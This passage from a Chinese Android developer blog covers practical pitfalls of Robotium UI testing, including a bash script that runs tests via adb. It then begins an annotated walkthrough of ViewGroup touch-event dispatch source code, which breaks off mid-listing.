<li>对上述框架的接口进行了统一，调用比较方便<h3 id="最终框架选择"><a href="#最终框架选择" class="headerlink" title="最终框架选择"></a>最终框架选择</h3>通过上述比较，可以看到Robotium在满足我们要求的同时统一了接口，故选择Robotium作为使用的框架。<h2 id="使用过程中踩的一些大坑"><a href="#使用过程中踩的一些大坑" class="headerlink" title="使用过程中踩的一些大坑"></a>使用过程中踩的一些大坑</h2><h3 id="变量必须使用static"><a href="#变量必须使用static" class="headerlink" title="变量必须使用static"></a>变量必须使用static</h3>在<code>AndroidTest</code>类中，期望使用一个<code>boolean</code>标志来判断是否已经登陆过（避免重复检查登陆状态），发现在<code>login()</code>方法中置标志为true后进入下一个测试时这个值仍为<code>false</code>，推测运行测试方法时各个方法的运行是独立的，故不使用静态变量则无法保存状态。<h3 id="等待引发的问题"><a href="#等待引发的问题" class="headerlink" title="等待引发的问题"></a>等待引发的问题</h3><h4 id="等待？"><a href="#等待？" class="headerlink" title="等待？"></a>等待？</h4>在我们对<code>View</code>进行一个操作以后，框架会自动处理下一步动作触发的时机，比如点击一个<code>Tab</code>后，会自动等待下一个页面出现再执行下面的操作。这个等待判断的原理没有看过源码不能确定，但是实际中遇到比如<code>WebView</code>加载页这样等待时间较长的页面，就会触发下一个操作的执行。<br>那么问题就出现了，如果想要进行这样的测试：点击打开一个文档，等待文档打开完毕以后检查标题是否是我们打开的文档，如果在文档没有加载完的时候就执行检查步骤，就会产生<code>Element not found</code>的错误。<h4 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h4></li>
</ul>
</li>
<li>强行设置等待时间<br>利用<code>SystemClock.sleep()</code>方法强行让测试暂停一段时间，这个方法比较暴力也不优雅，不到万不得已不要使用。</li>
<li>使用<code>Robotium</code>提供的各种<code>wait</code>方法，通过设置退出条件来等待：<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">waitForWebView</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    assertTrue(mSolo.waitForCondition(<span class="keyword">new</span> Condition() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isSatisfied</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            View loading = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                loading = mSolo.getView(R.id.loading);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (AssertionFailedError e) &#123;</span><br><span class="line">                Log.e(TAG, e.getMessage());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span> == loading || View.GONE == loading.getVisibility();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;, DOC_LOAD_TIMEOUT));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
在解决上面的问题的时候就使用了上面的代码来等待<code>WebView</code>文档加载完毕，返回<code>true</code>时条件满足，退出等待，若超时，则方法返回<code>false</code>，<code>assert</code>失败表示<code>doc</code>加载超时。此处的判断方法是等待<code>loading</code>隐藏。<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">waitForActivity</span><span class="params">(Class&lt;? extends Activity&gt; activity)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (mSolo.getCurrentActivity().getClass() == activity) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    assertTrue(mSolo.waitForActivity(activity));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
上述代码是为了等待<code>activity</code>启动，可以用于判断新的<code>activity</code>是否正常启动。<h3 id="跨进程引发的问题"><a href="#跨进程引发的问题" class="headerlink" title="跨进程引发的问题"></a>跨进程引发的问题</h3>在应用中，打开的文档运行在一个新的进程中，在使用<code>Espresso</code>的时候就遇到了问题：无法拿到新进程中<code>WebView</code>的信息，原因没有仔细分析，但可以确定是跨进程的问题。在<code>Robotium</code>中这个问题同样存在。<br>不但如此，多进程还会导致当前<code>activity</code>的判断出错，本应判断在<code>DocActivity</code>中，但实际上得到的是在原进程的<code>activity</code>中。<br>在多种方法尝试无果后，只能暂时修改源码，将<code>doc</code>放在同进程打开。<h3 id="View获取的问题"><a href="#View获取的问题" class="headerlink" title="View获取的问题"></a>View获取的问题</h3>获取想要的<code>View</code>是编写用例最主要的难点所在，在获取<code>View</code>的时候也遇到了不少的坑：<h4 id="重复出现的View"><a href="#重复出现的View" class="headerlink" title="重复出现的View"></a>重复出现的View</h4><strong>实际上通过<code>getCurrentViews()</code>获取到的View对象包括所有<code>activity</code>的所有<code>View</code></strong>，比如主页面有3个<code>tab</code>，每个<code>tab</code>中有一个<code>RecyclerView</code>，<strong>这三个RecyclerView都是可以被获取到的（而不是想象中的只获取到当前可见的这个），甚至在打开新的<code>activity</code>后，后台的<code>activity</code>中的<code>RecyclerView</code>还是可以被获取到的。但是使用<code>getView()</code>方法获取的范围是当前<code>activity</code>。</strong><br>这意味着什么呢？如果这些<code>RecyclerView</code>有相同的<code>id</code>，使用<code>getView(int id)</code>方法获取到的只是第一个，即使切到了第二个<code>tab</code>，获取到的还是第一个<code>tab</code>中的<code>RecyclerView</code>。<br>面对这个情况我们可以用三种方法：</li>
<li>如果它们<code>id</code>不同，使用<code>getView(int id)</code>就可以拿到特定的。如果<code>id</code>相同，可以传入第二个<code>index</code>参数来获取同<code>id</code>的第n个实例</li>
<li>使用<code>getView(类名, int index)</code>拿到该类所有实例中的第n个，因为各个<code>RecyclerView</code>加载的顺序是相对固定的，所以每次运行拿到的<code>RecyclerView</code>是同一个。拿上面的例子来说，如果要拿到第二个<code>tab</code>中的<code>RecyclerView</code>，要获取的应该是第2个。</li>
<li>先获取它的任意一个<code>ParentView</code>，然后通过<code>getCurrentViews(类名，ViewGroup)</code>方法拿到<code>List</code>，如果<code>ViewGroup</code>是唯一的，这个<code>List</code>中应该只会有我们想要的那个，也可以用<code>ViewGroup</code>来缩小我们搜索的范围。<h4 id="View获取的技巧"><a href="#View获取的技巧" class="headerlink" title="View获取的技巧"></a>View获取的技巧</h4>总结一下</li>
<li>定位<code>View</code>最为方便的就是使用<code>getView(int id/类名)</code>这个方式，如果<code>id</code>/类名的实例唯一，就可以直接拿到。</li>
<li>如果同<code>id</code>/类名有很多个<code>view</code>存在，要使用<code>getView(int id/类名, int index)</code>，拿到第n个<code>view</code>实例。</li>
<li>如果该<code>view</code>所处的<strong>任一个<code>ViewGroup</code>很好获取（有唯一id/类名）</strong>，可以通过<code>getCurrentViews(类名, ViewGroup)</code>这个方式迅速缩小范围，拿到想要的<code>View</code>。<h4 id="RecyclerView中获取ViewHolder"><a href="#RecyclerView中获取ViewHolder" class="headerlink" title="RecyclerView中获取ViewHolder"></a>RecyclerView中获取ViewHolder</h4><code>Robotium</code>允许我们直接拿到<code>View</code>对象，所以我们可以直接使用<code>RecyclerView</code>的<code>findViewHolderForAdapterPosition()</code>方法去拿<code>ViewHolder</code>，但是事情并没有这么简单，我们知道<code>RecyclerView</code>的特点是没有在屏幕上显示的<code>ViewHolder</code>是没有被实例化的，这样拿到的会是<code>null</code>，所以为了拿到所有<code>ViewHolder</code>我们还需要使用<br><code>scrollDownRecyclerView()</code>方法让<code>RecyclerView</code>滚动起来，但是使用这个方法还会有问题，有时候它会失效（怀疑是没有完成滚动就执行了下一条语句），<strong>所以还需要在调用这个方法之后设一个延迟（100ms就行）</strong>，样例代码如下：<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; listAdapter.getItemCount(); i++) &#123;</span><br><span class="line">    RecyclerView.ViewHolder viewHolder = recyclerView.findViewHolderForAdapterPosition(i);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">null</span> == viewHolder) &#123;</span><br><span class="line">        mSolo.scrollDownRecyclerView(<span class="number">0</span>);</span><br><span class="line">        SystemClock.sleep(<span class="number">100</span>);</span><br><span class="line">        viewHolder = recyclerView.findViewHolderForAdapterPosition(i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (testAction.test(listAdapter, viewHolder, i)) &#123;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="WebView中的WebElement获取需要延迟"><a href="#WebView中的WebElement获取需要延迟" class="headerlink" title="WebView中的WebElement获取需要延迟"></a>WebView中的WebElement获取需要延迟</h3>之前介绍了等待<code>WebView</code>加载的方法，但是实际上这个方法返回后通过<code>getWebElements()</code>拿到的<code>WebElements</code>是空的，实际上想要拿到<code>WebElement</code>还要等待几秒种的时间。<h3 id="输入字符的问题"><a href="#输入字符的问题" class="headerlink" title="输入字符的问题"></a>输入字符的问题</h3><h4 id="直接输入字符的方法"><a href="#直接输入字符的方法" class="headerlink" title="直接输入字符的方法"></a>直接输入字符的方法</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">inputString</span><span class="params">(String text)</span> </span>&#123;</span><br><span class="line">    InstrumentationRegistry.getInstrumentation().sendStringSync(text);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
会把<code>string</code>拆分成按键序列输入。<h4 id="丢失字符的问题"><a href="#丢失字符的问题" class="headerlink" title="丢失字符的问题"></a>丢失字符的问题</h4>调用上面的方法输入的字符过长的时候会偶发出现字符丢失的问题，暂时不知道解决方法，只能输入短一点的字符。<h3 id="方法调用顺序的问题"><a href="#方法调用顺序的问题" class="headerlink" title="方法调用顺序的问题"></a>方法调用顺序的问题</h3>写在<code>AndroidTest</code>文件夹下同一个测试类中的各个方法的调用顺序是未知的，而且没有找到好的办法可以直接在内部决定它们的调用顺序，本来这并不是一个大问题，但是在写测试的过程中出现了一个比较致命的问题：连续打开<code>WebView</code>会导致<code>WebView</code>无法加载。这个问题应该是由于复用了<code>WebView</code>或者<code>loading view</code>的判断出了问题导致的。单独单次地运行单个测试方法并不会出现这个问题，所以考虑转而使用手写测试脚本 的方式来决定方法的调用顺序并且单次地运行单个测试方法。同时脚本还应该支持重新编译测试Apk并且安装到手机，并且可以指定测试的方法与执行顺序。<br>最终编写完成的脚本如下：<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">rebuild_install</span></span>() &#123;</span><br><span class="line">    ./gradlew --build-cache :app:assemblePublishxxxDebug :app:assemblePublishxxxDebugAndroidTest</span><br><span class="line">    adb push app/build/outputs/apk/publishxxx/debug/app-publish-xxx-debug.apk /data/<span class="built_in">local</span>/tmp/com.xxx.xx.xxxx</span><br><span class="line">    adb shell pm install -t -r <span class="string">"/data/local/tmp/com.xxx.xx.xxxx"</span></span><br><span class="line">    adb push app/build/outputs/apk/androidTest/publishxxx/debug/app-publish-xxx-debug-androidTest.apk /data/<span class="built_in">local</span>/tmp/com.xxx.xx.xxxx</span><br><span class="line">    adb shell pm install -t -r <span class="string">"/data/local/tmp/com.xxx.xx.xxxx"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line"><span class="keyword">if</span> [ -n <span class="string">"<span class="variable">$1</span>"</span> ] &amp;&amp; [ <span class="string">"<span class="variable">$1</span>"</span> = rebuild ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">    rebuild_install</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> Not Rebuild</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">test_funcs=($(awk <span class="string">'&#123;print $0&#125;'</span> ui_test/funtion_names.txt))</span><br><span class="line"><span class="keyword">for</span> funcs <span class="keyword">in</span> <span class="variable">$&#123;test_funcs[@]&#125;</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> ┌--------------------------------------</span><br><span class="line">    <span class="built_in">echo</span> Start <span class="variable">$funcs</span></span><br><span class="line">    adb shell am force-stop com.xxx.xx.xxxx</span><br><span class="line">    adb shell am instrument -w -r   -e debug <span class="literal">false</span> -e class com.xxx.xx.xxxx.MainInstrumentedTest<span class="comment">#$funcs com.xxx.xx.xxxx.test/android.support.test.runner.AndroidJUnitRunner | sed -En -e '/There was/,/FAILURES/p;/OK/p'</span></span><br><span class="line">    <span class="built_in">echo</span> └--------------------------------------</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
需要测试的方法按顺序放在funtion_names.txt文件中：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">checkLogout</span><br><span class="line">checkNewDoc</span><br><span class="line">checkCreateDoc</span><br><span class="line">checkOpenShare</span><br></pre></td></tr></table></figure>
在使用时可以传入<code>rebuild</code>参数来重新构建并安装，未传入可以直接开始测试：<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./test.sh rebuild // 重新构建并安装</span><br><span class="line">./test.sh //直接测试</span><br></pre></td></tr></table></figure>
运行结果示例：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Not Rebuild</span><br><span class="line">┌--------------------------------------</span><br><span class="line">Start checkLogout</span><br><span class="line">OK (1 test)</span><br><span class="line">└--------------------------------------</span><br><span class="line">┌--------------------------------------</span><br><span class="line">Start checkNewDoc</span><br><span class="line">OK (1 test)</span><br><span class="line">└--------------------------------------</span><br><span class="line">┌--------------------------------------</span><br><span class="line">Start checkCreateDoc</span><br><span class="line">OK (1 test)</span><br><span class="line">└--------------------------------------</span><br><span class="line">┌--------------------------------------</span><br><span class="line">Start checkOpenShare</span><br><span class="line">OK (1 test)</span><br><span class="line">└--------------------------------------</span><br></pre></td></tr></table></figure>
</li>
</ul>
]]></content>
      <categories>
        <category>Android</category>
        <category>Test</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>Test</tag>
      </tags>
  </entry>
  <entry>
    <title>Android 触摸事件分发机制（三）View触摸事件分发机制</title>
    <url>/2017/11/02/android_view_event_3/</url>
    <content><![CDATA[<h2 id="View触摸事件分发"><a href="#View触摸事件分发" class="headerlink" title="View触摸事件分发"></a>View触摸事件分发</h2><p>经过<a href="http://www.viseator.com/2017/09/14/android_view_event_1/">前面的两篇文章</a>，我们终于从内核（触摸事件的真正来源）一路经过<code>Native</code>层通过消息机制来到了需要接收的应用的主线程消息队列中然后被处理，首先调用的是应用根<code>View</code>（<code>DecorView</code>)的<code>dispatchPointerEvent()</code>方法（继承自<code>View</code>）：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">boolean</span> <span class="title">dispatchPointerEvent</span><span class="params">(MotionEvent event)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (event.isTouchEvent()) &#123;</span><br><span class="line">        <span class="keyword">return</span> dispatchTouchEvent(event);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> dispatchGenericMotionEvent(event);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>调用了<code>ViewGroup</code>的<code>dispatchTouchEvent()</code>方法（<code>DecorView</code>继承自<code>FrameLayout</code>）：</p>
<a id="more"></a>
<h3 id="dispatchTouchEvent-ViewGroup"><a href="#dispatchTouchEvent-ViewGroup" class="headerlink" title="dispatchTouchEvent(ViewGroup)"></a>dispatchTouchEvent(ViewGroup)</h3><p>顾名思义，这个方法就是<code>ViewGroup</code>的触摸事件分发方法，它重写了父类<code>View</code>的该方法，<code>View</code>也有自己的<code>dispatchTouchEvent()</code>方法（后面再讲）。</p>
<p>这个方法非常长，我们拆开来分析，首先我们要明确一点，由于<code>Android</code>在系统级别引入了辅助功能选项（<code>AccessibilityFoucs</code>）来帮助有障碍的用户使用系统，所以如果一个事件带有<code>TargetAccessibilityFocus</code>标志，说明这是一个特殊的辅助功能事件，需要进行特殊处理（虽然这种情况比较少见）。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">dispatchTouchEvent</span><span class="params">(MotionEvent ev)</span> </span>&#123;	</span><br><span class="line"><span class="comment">// 如果是辅助功能事件，并且当前view是目标view，那么取消标志，进行普通分发</span></span><br><span class="line"><span class="keyword">if</span> (ev.isTargetAccessibilityFocus() &amp;&amp; isAccessibilityFocusedViewOrHost()) &#123;</span><br><span class="line">          ev.setTargetAccessibilityFocus(<span class="keyword">false</span>);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">boolean</span> handled = <span class="keyword">false</span>;</span><br><span class="line"><span class="comment">// 安全原因检查触摸事件</span></span><br><span class="line">      <span class="keyword">if</span> (onFilterTouchEventForSecurity(ev)) &#123;</span><br><span class="line">          <span class="keyword">final</span> <span class="keyword">int</span> action = ev.getAction();</span><br><span class="line">          <span class="keyword">final</span> <span class="keyword">int</span> actionMasked = action &amp; MotionEvent.ACTION_MASK;</span><br><span class="line">	<span class="comment">// 如果事件类型是按下，清除之前的处理，重新开始处理触摸动作</span></span><br><span class="line">          <span class="keyword">if</span> (actionMasked == MotionEvent.ACTION_DOWN) &#123;</span><br><span class="line">              cancelAndClearTouchTargets(ev);</span><br><span class="line">              resetTouchState();</span><br><span class="line">          &#125;</span><br><span class="line">	<span class="comment">// 拦截标志（重要）</span></span><br><span class="line">          <span class="keyword">final</span> <span class="keyword">boolean</span> intercepted;</span><br><span class="line">          <span class="comment">// 如果是按下事件（新的触摸动作），或者已经存在处理事件的子View</span></span><br><span class="line">          <span class="keyword">if</span> (actionMasked == MotionEvent.ACTION_DOWN</span><br><span class="line">                  || mFirstTouchTarget != <span class="keyword">null</span>) &#123;</span><br><span class="line">              <span class="comment">// 检查是否不允许拦截事件（requestDisallowInterceptTouchEvent(true)被调用的情况）</span></span><br><span class="line">              <span class="keyword">final</span> <span class="keyword">boolean</span> disallowIntercept = (mGroupFlags &amp; FLAG_DISALLOW_INTERCEPT) != <span class="number">0</span>;</span><br><span class="line">              <span class="keyword">if</span> (!disallowIntercept) &#123;</span><br><span class="line">                  <span class="comment">// 调用onInterceptTouchEvent方法确定是否拦截事件（后面讲）</span></span><br><span class="line">                  intercepted = onInterceptTouchEvent(ev);</span><br><span class="line">                  ev.setAction(action); <span class="comment">// 恢复action状态以避免其在上一行中被改变</span></span><br><span class="line">              &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                  <span class="comment">// 不拦截（不允许）</span></span><br><span class="line">                  intercepted = <span class="keyword">false</span>;</span><br><span class="line">              &#125;</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">              <span class="comment">// 如果不是一个新触摸动作的开始（不是down），并且没有处理该消息的目标（mFirstTouchTarget为null），说明当前view应该负责处理该事件，则当前view应该继续拦截并处理这个事件</span></span><br><span class="line">              intercepted = <span class="keyword">true</span>;</span><br><span class="line">          &#125;</span><br><span class="line">	<span class="comment">// 如果被当前view拦截，或者已经有处理该事件的目标，则去除辅助功能标志，进行普通的事件分发</span></span><br><span class="line">          <span class="keyword">if</span> (intercepted || mFirstTouchTarget != <span class="keyword">null</span>) &#123;</span><br><span class="line">              ev.setTargetAccessibilityFocus(<span class="keyword">false</span>);</span><br><span class="line">          &#125;</span><br></pre></td></tr></table></figure>
<p>这一段就是检测该<code>view</code>是否应该被拦截，虽然没有看下面的代码，我们可以猜测如果<code>intercepted</code>标志为<code>true</code>，那么这个事件就会留在该<code>view</code>被处理而不会再向其子<code>view</code>分发。下面是<code>ViewGroup</code>默认的处理方式：</p>
<h4 id="onInterceptTouchEvent"><a href="#onInterceptTouchEvent" class="headerlink" title="onInterceptTouchEvent()"></a>onInterceptTouchEvent()</h4><p><br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onInterceptTouchEvent</span><span class="params">(MotionEvent ev)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (ev.isFromSource(InputDevice.SOURCE_MOUSE)</span><br><span class="line">            &amp;&amp; ev.getAction() == MotionEvent.ACTION_DOWN</span><br><span class="line">            &amp;&amp; ev.isButtonPressed(MotionEvent.BUTTON_PRIMARY)</span><br><span class="line">            &amp;&amp; isOnScrollbarThumb(ev.getX(), ev.getY())) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这个方法默认只是对一个特殊情况作了特殊的拦截处理。</p>
<h3 id="dispatchTouchEvent-ViewGroup-1"><a href="#dispatchTouchEvent-ViewGroup-1" class="headerlink" title="dispatchTouchEvent(ViewGroup)"></a>dispatchTouchEvent(ViewGroup)</h3><p>继续向下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 检查是否为取消事件</span></span><br><span class="line"><span class="keyword">final</span> <span class="keyword">boolean</span> canceled = resetCancelNextUpFlag(<span class="keyword">this</span>)</span><br><span class="line">                 || actionMasked == MotionEvent.ACTION_CANCEL;</span><br><span class="line"><span class="comment">// 分离触摸事件标志，如果是多点触摸，分别分发给多个view</span></span><br><span class="line">         <span class="keyword">final</span> <span class="keyword">boolean</span> split = (mGroupFlags &amp; FLAG_SPLIT_MOTION_EVENTS) != <span class="number">0</span>;</span><br><span class="line">         TouchTarget newTouchTarget = <span class="keyword">null</span>;</span><br><span class="line">         <span class="keyword">boolean</span> alreadyDispatchedToNewTouchTarget = <span class="keyword">false</span>;</span><br><span class="line"><span class="comment">// 如果未被取消并且没有被当前view拦截，应该进行向下分发</span></span><br><span class="line">         <span class="keyword">if</span> (!canceled &amp;&amp; !intercepted) &#123;</span><br><span class="line"></span><br><span class="line">           <span class="comment">// 如果是辅助功能事件，我们调用findChildWithAccessibilityFocus()来找到接收该事件的目标view  </span></span><br><span class="line">           View childWithAccessibilityFocus = ev.isTargetAccessibilityFocus()</span><br><span class="line">                     ? findChildWithAccessibilityFocus() : <span class="keyword">null</span>;</span><br><span class="line">	<span class="comment">// 如果是一个按下事件（初始事件）</span></span><br><span class="line">             <span class="keyword">if</span> (actionMasked == MotionEvent.ACTION_DOWN</span><br><span class="line">                     || (split &amp;&amp; actionMasked == MotionEvent.ACTION_POINTER_DOWN)</span><br><span class="line">                     || actionMasked == MotionEvent.ACTION_HOVER_MOVE) &#123;</span><br><span class="line">                 <span class="keyword">final</span> <span class="keyword">int</span> actionIndex = ev.getActionIndex(); <span class="comment">// 按下事件为0</span></span><br><span class="line">                 <span class="comment">// 获取触摸点对应的PointerId，一个id表示一个触摸点，如果不分离，则获取全部的id</span></span><br><span class="line">                 <span class="keyword">final</span> <span class="keyword">int</span> idBitsToAssign = split ? <span class="number">1</span> &lt;&lt; ev.getPointerId(actionIndex)</span><br><span class="line">                         : TouchTarget.ALL_POINTER_IDS;</span><br><span class="line"></span><br><span class="line">                 <span class="comment">// 清除之前的id信息</span></span><br><span class="line">                 removePointersFromTouchTargets(idBitsToAssign);</span><br><span class="line"></span><br><span class="line">                 <span class="keyword">final</span> <span class="keyword">int</span> childrenCount = mChildrenCount;</span><br><span class="line">                 <span class="keyword">if</span> (newTouchTarget == <span class="keyword">null</span> &amp;&amp; childrenCount != <span class="number">0</span>) &#123;</span><br><span class="line">                     <span class="keyword">final</span> <span class="keyword">float</span> x = ev.getX(actionIndex);</span><br><span class="line">                     <span class="keyword">final</span> <span class="keyword">float</span> y = ev.getY(actionIndex);</span><br><span class="line">					<span class="comment">// 创建待遍历的view列表，调用了buildTouchDispatchChildList()方法（见下文）</span></span><br><span class="line">                     <span class="keyword">final</span> ArrayList&lt;View&gt; preorderedList = buildTouchDispatchChildList();</span><br><span class="line">                     <span class="comment">// 是否采用自定义view顺序（这个顺序将决定哪个view会先接收到事件）</span></span><br><span class="line">                     <span class="keyword">final</span> <span class="keyword">boolean</span> customOrder = preorderedList == <span class="keyword">null</span></span><br><span class="line">                             &amp;&amp; isChildrenDrawingOrderEnabled();</span><br><span class="line">                     <span class="keyword">final</span> View[] children = mChildren;</span><br></pre></td></tr></table></figure>
<p>这段主要为后面的查找目标<code>view</code>作准备，我们先建立了<code>preorderedList</code>列表，我们来看看这个列表的顺序是如何构建的：</p>
<h4 id="构建待遍历的view数组"><a href="#构建待遍历的view数组" class="headerlink" title="构建待遍历的view数组"></a>构建待遍历的view数组</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ArrayList&lt;View&gt; <span class="title">buildTouchDispatchChildList</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> buildOrderedChildList();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function">ArrayList&lt;View&gt; <span class="title">buildOrderedChildList</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">int</span> childrenCount = mChildrenCount;</span><br><span class="line">    <span class="comment">// 如果子view数小于等于1，或没有子view有z轴，直接返回null</span></span><br><span class="line">    <span class="keyword">if</span> (childrenCount &lt;= <span class="number">1</span> || !hasChildWithZ()) <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (mPreSortedChildren == <span class="keyword">null</span>) &#123;</span><br><span class="line">        mPreSortedChildren = <span class="keyword">new</span> ArrayList&lt;&gt;(childrenCount);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        mPreSortedChildren.clear();</span><br><span class="line">        mPreSortedChildren.ensureCapacity(childrenCount);</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">// 如果自定义绘制顺序，则应使用自定义分发顺序</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">boolean</span> customOrder = isChildrenDrawingOrderEnabled();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; childrenCount; i++) &#123;</span><br><span class="line">        <span class="comment">// 获取正确的子view索引（不为自定义顺序时为i，自定义顺序时为自定义顺序对应的索引</span></span><br><span class="line">        <span class="keyword">final</span> <span class="keyword">int</span> childIndex = getAndVerifyPreorderedIndex(childrenCount, i, customOrder);</span><br><span class="line">        <span class="keyword">final</span> View nextChild = mChildren[childIndex];</span><br><span class="line">        <span class="comment">// 保存z值</span></span><br><span class="line">        <span class="keyword">final</span> <span class="keyword">float</span> currentZ = nextChild.getZ();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果列表中最后一个view的z值大于待插入的view，将当前view插入其之前，保证在后面从后向前遍历view时可以保存在屏幕最上面的view可以先接收到触摸事件</span></span><br><span class="line">        <span class="keyword">int</span> insertIndex = i;</span><br><span class="line">        <span class="keyword">while</span> (insertIndex &gt; <span class="number">0</span> &amp;&amp; mPreSortedChildren.get(insertIndex - <span class="number">1</span>).getZ() &gt; currentZ) &#123;</span><br><span class="line">            insertIndex--;</span><br><span class="line">        &#125;</span><br><span class="line">        mPreSortedChildren.add(insertIndex, nextChild);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> mPreSortedChildren;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>总的来说，就是如果有自定义绘制顺序，那么按自定义绘制顺序，否则按默认绘制顺序，然后如果<code>view</code>定义了<code>z</code>值属性，那么在屏幕最上层的<code>view</code>应该先接收到触摸事件。</p>
<h3 id="dispatchTouchEvent-ViewGroup-2"><a href="#dispatchTouchEvent-ViewGroup-2" class="headerlink" title="dispatchTouchEvent(ViewGroup)"></a>dispatchTouchEvent(ViewGroup)</h3><p>回到分发方法，继续向下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">				<span class="keyword">for</span> (<span class="keyword">int</span> i = childrenCount - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">                        <span class="comment">// 从preorderList中获取到正确的索引与子view</span></span><br><span class="line">                        <span class="keyword">final</span> <span class="keyword">int</span> childIndex = getAndVerifyPreorderedIndex(</span><br><span class="line">                                childrenCount, i, customOrder);</span><br><span class="line">                        <span class="keyword">final</span> View child = getAndVerifyPreorderedView(</span><br><span class="line">                                preorderedList, children, childIndex);</span><br><span class="line"></span><br><span class="line">                        <span class="comment">// 如果需要处理辅助功能事件（找到了目标子view） if (childWithAccessibilityFocus != null) &#123;</span></span><br><span class="line">                            <span class="comment">// 保证该子view最先接收到事件</span></span><br><span class="line">                            <span class="keyword">if</span> (childWithAccessibilityFocus != child) &#123;</span><br><span class="line">                                <span class="keyword">continue</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="comment">// 找到该子view后清除目标的记录</span></span><br><span class="line">                            childWithAccessibilityFocus = <span class="keyword">null</span>;</span><br><span class="line">                            <span class="comment">// 如果该子view没有处理辅助功能事件，那么应该重新遍历view进行普通分发，故将i重置</span></span><br><span class="line">                            i = childrenCount - <span class="number">1</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">			<span class="comment">// 两个方法分别检查子view是否能接收触摸事件 与 触摸事件在该view的范围内，如果都成立，说明找到了应该处理该事件的子view</span></span><br><span class="line">                        <span class="keyword">if</span> (!canViewReceivePointerEvents(child)</span><br><span class="line">                                || !isTransformedTouchPointInView(x, y, 